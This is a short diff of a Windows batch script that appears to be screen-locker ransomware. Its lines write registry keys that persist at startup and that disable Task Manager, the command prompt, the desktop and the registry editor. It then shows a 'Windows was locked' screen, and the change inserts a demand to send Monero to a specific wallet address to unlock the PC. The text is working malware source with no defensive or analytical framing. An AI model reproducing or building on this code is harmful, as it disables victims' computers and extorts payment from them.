@@ -13,7 +13,7 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Win32 /t REG_SZ /d
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul
 
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 
 
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
 
@@ -22,7 +22,7 @@ title Windows was locked!
 
 echo windows was locked!
 
-echo Your PC was locked!
+echo send 1 monero to on45fwnWA22bK7xT19mWWHtc76Y7uWBuenTMknwNM228Gp2rq7xpMsg1pXZcFDHBbz1wXhhSzdqkcekMgSDu9rqk9w5o7fcVh to unlock
 
 echo Enter Password:
 
